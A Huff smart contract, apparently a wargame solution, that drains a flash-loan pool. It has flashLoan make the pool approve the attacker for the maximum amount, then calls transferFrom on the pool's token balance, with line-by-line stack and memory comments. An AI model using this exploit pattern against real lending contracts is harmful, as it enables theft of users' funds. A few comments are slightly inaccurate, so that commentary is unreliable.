// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_SLOT = FREE_STORAGE_POINTER() 
#define constant TOKEN_SLOT = FREE_STORAGE_POINTER()
#define constant MAX_VAL = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address (1st constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    dup2            // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address (2nd constructor arg)

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [pool] - copied vault onto stack from byte offset 0x00 in mem
    [POOL_SLOT]     // [0x01, pool] - storage slot where to store pool
    sstore          // [] - copied pool to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address (1st constructor arg)

    0x20            // [0x20] - byte offset in memory
    mload           // [token] - copied token onto stack from byte offset 0x20 in mem
    [TOKEN_SLOT]    // [0x02] - storage slot where token will be copied to 
    sstore          // [] - copied token to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address (1st constructor arg)
    // [SLOT 0x02] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address (2nd constructor arg)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy 'flashLoan(uint256,address,address,bytes)' func sig into mem to use as calldata for CALL
    0xab19e0c0      // [0xab19e0c0] - func sig
    0x00            // [0x00, 0x4ce3329d] - byte offset in mem
    mstore          // [] - copied func sig into memory at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000ab19e0c0 -> `flashLoan(uint256,address,address,bytes)` func sig
    
    // Copy token and pool onto stack to use for CALLs and STATICCALLs
    [TOKEN_SLOT]    // [0x02] - storage slot where token is
    sload           // [token] - copied token onto stack from storage slot 0x02
    [POOL_SLOT]     // [0x01, token] - storage slot where pool is
    sload           // [pool, token] - copied pool onto stack from storage slot 0x01
    address         // [self, pool, token] - self
    0x40            // [0x40, self, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied self into mem at offset 0x40 (first param, amount, is 0 @ 0x20)
    dup2            // [token, pool, token] - duplicate token to top of stack
    0x60            // [0x60, token, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied token into memory at offset 0x60

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000ab19e0c0 -> `flashLoan(uint256,address,address,bytes)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000000000000 -> amount  (uint256)
    // [OFFSET 0x40]  000000000000000000000000827Bec6886d0C5674944cc66F26579e2d2941F58 -> self (address)
    // [OFFSET 0x60]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address

    // The fourth argument is of type bytes so we will craft the calldata
    // The bytes param will have calldata for the approve(address,uint256) function
    // Therefore it will have a total length of 160 bytes (0xa0) => byte offset(32) + length(32) + func_sig(4) + address(32) + amount(32) + 28 bytes of padding 
    0x80            // [0x80, pool, token] - byte offset for bytes param
    0x80            // [0x80, 0x80, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied 0x80 into mem at byte offset 0x80
    0x44            // [0x44, pool, token] - length of bytes calldata: 68 bytes
    0xa0            // [0xa0, 0x44, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied 68 into mem at byte offset 0xa0

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000ab19e0c0 -> `flashLoan(uint256,address,address,bytes)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000000000000 -> amount  (uint256)
    // [OFFSET 0x40]  000000000000000000000000827Bec6886d0C5674944cc66F26579e2d2941F58 -> self (address)
    // [OFFSET 0x60]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]  0000000000000000000000000000000000000000000000000000000000000044 -> bytes param length

    // Copy `approve(address,uint256)` and arg values into mem to use as calldata for bytes param
    0x095ea7b3      // [0x095ea7b3, pool, token] - func sig
    0xe0            // [0xe0, 0x095ea7b3, pool, token] - # bits to shift left by (224)
    shl             // [0x095ea7b3_, pool, token] - shifted func sig left by 192 bits
    0xc0            // [0xc0, 0x095ea7b3_, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied func sig into mem at offset 0x80
    address         // [address, pool, token] - self
    0xc4            // [0xc4, address, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied self into mem at offset 0xc4
    [MAX_VAL]       // [max_val, pool, token] - max uint256
    0xe4            // [0xe4, max_val, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied max val into mem at offset 0xe4

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000ab19e0c0 -> `flashLoan(uint256,address,address,bytes)` func sig
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000000 -> amount  (uint256)
    // [OFFSET 0x40]   000000000000000000000000827Bec6886d0C5674944cc66F26579e2d2941F58 -> self (address)
    // [OFFSET 0x60]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000044 -> bytes param length
    // [OFFSET 0xc0]   095ea7b3000000000000000000000000827Bec6886d0C5674944cc66F26579e2 -> `approve(address,uint256)` func sig + self
    // [OFFSET 0xe0]   d2941F58ffffffffffffffffffffffffffffffffffffffffffffffffffffffff -> rest of self + max val
    // [OFFSET 0x100]  ffffffff00000000000000000000000000000000000000000000000000000000 -> rest of max val + padding

    // CALL into pool
    0x00            // [0x00, pool, token] - size of return data
    0x00            // [0x00, 0x00, pool, token] - byte offset in mem where return data is copied
    0x104           // [0x104, 0x00, 0x00, pool, token] - size of calldat
    0x1c            // [0x1c, 0x104, 0x00, 0x00, pool, token] - byte offset in mem where calldata starts
    dup3            // [0x00, 0x1c, 0x104, 0x00, 0x00, pool, token] - msg.value to send with call (none)
    dup6            // [pool, 0x00, 0x1c, 0x104, 0x00, 0x00, pool, token] - calling pool
    gas             // [gas, pool, 0x00, 0x1c, 0x104, 0x00, 0x00, pool, token] - gas to send with call (gasleft())
    call            // [success, pool, token] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero          // [0/1, pool, token]
    throw_error     // [throw_error, 0/1, pool, token]
    jumpi           // [pool, token]

    // Copy `balanceOf(address)` func sig and pool into memory to use as calldata for STATICCALL
    0x70a08231      // [0x70a08231, pool, token] - func sig
    0x00            // [0x00, 0x70a08231, pool, token] - byte offset in mem
    mstore          // [pool, token] - copied func sig into memory at offset 0x00
    0x20            // [0x20, pool, token] - byte offset in mem
    mstore          // [token] - copied pool into mem at offset 0x20
    caller          // [owner, token] - msg.sender is token due to modifier
    0x40            // [0x40, owner, token] - byte offset in mem
    mstore          // [token] - copied owner into mem at offset 0x40 for future CALL
    
    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]   000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address
    // [OFFSET 0x40]   000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x60]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000044 -> bytes param length
    // [OFFSET 0xc0]   095ea7b3000000000000000000000000827Bec6886d0C5674944cc66F26579e2 -> `approve(address,uint256)` func sig + self
    // [OFFSET 0xe0]   d2941F58ffffffffffffffffffffffffffffffffffffffffffffffffffffffff -> rest of self + max val
    // [OFFSET 0x100]  ffffffff00000000000000000000000000000000000000000000000000000000 -> rest of max val + padding

    // STATICCALL into instance
    0x20            // [0x20, token] - size of return data (uint256)
    0x60            // [0x60, 0x20, token] - byte offset in mem where return data will be copied
    0x24            // [0x24, 0x60, 0x20, token] - size of calldata
    0x1c            // [0x1c, 0x24, 0x60, 0x20, token] - byte offset in mem where calldata starts
    dup5            // [token, 0x1c, 0x24, 0x60, 0x20, token] - calling token
    gas             // [gas, token, 0x1c, 0x24, 0x60, 0x20, token] - gas to send with staticcall (gasleft())
    staticcall      // [success, token] - consumes6 items off stack and pushes 1 if call was successful, 0 otherwise
    iszero          // [0/1, token]
    throw_error     // [throw_error, 0/1, token]
    jumpi           // [token]

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]   000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address
    // [OFFSET 0x40]   000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256)
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000044 -> bytes param length
    // [OFFSET 0xc0]   095ea7b3000000000000000000000000827Bec6886d0C5674944cc66F26579e2 -> `approve(address,uint256)` func sig + self
    // [OFFSET 0xe0]   d2941F58ffffffffffffffffffffffffffffffffffffffffffffffffffffffff -> rest of self + max val
    // [OFFSET 0x100]  ffffffff00000000000000000000000000000000000000000000000000000000 -> rest of max val + padding

    // Copy `transferFrom(address,address,uint256)` func sig into mem to use as calldata for CALL
    0x23b872dd      // [0x23b872dd, token] - func sig
    0x00            // [0x00, 0x23b872dd, token] - byte offset
    mstore          // [token] - copied func sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]   0000000000000000000000000000000000000000000000000000000023b872dd -> `transferFrom(address,address,uint256)` func sig
    // [OFFSET 0x20]   000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address
    // [OFFSET 0x40]   000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x60]   00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256)
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000044 -> bytes param length
    // [OFFSET 0xc0]   095ea7b3000000000000000000000000827Bec6886d0C5674944cc66F26579e2 -> `approve(address,uint256)` func sig + self
    // [OFFSET 0xe0]   d2941F58ffffffffffffffffffffffffffffffffffffffffffffffffffffffff -> rest of self + max val
    // [OFFSET 0x100]  ffffffff00000000000000000000000000000000000000000000000000000000 -> rest of max val + padding

    // CALL into token
    0x00           // [0x00, token] - size of return data
    dup1           // [0x00, 0x00, token] - byte offset in mem where return data is copied 
    0x64           // [0x64, 0x00, 0x00, token] - size of calldata
    0x1c           // [0x1c, 0x64, 0x00, 0x00, token] - byte offset in mem where calldata starts
    dup3           // [0x00, 0x1c, 0x64, 0x00, 0x00, token] - msg.value to send with call (none)
    dup6           // [token, 0x00, 0x1c, 0x64, 0x00, 0x00, token] - calling token
    gas            // [gas, token, 0x00, 0x1c, 0x64, 0x00, 0x00, token] - gas to send with call (gasleft())
    call           // [success, token] - consumes 7 top items and pushes 1 if call did not revert, 0 otherwise
    iszero         // [0/1, token]
    throw_error    // [throw_error, 0/1, token]
    jumpi          // [token]
    pop            // []
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()
}
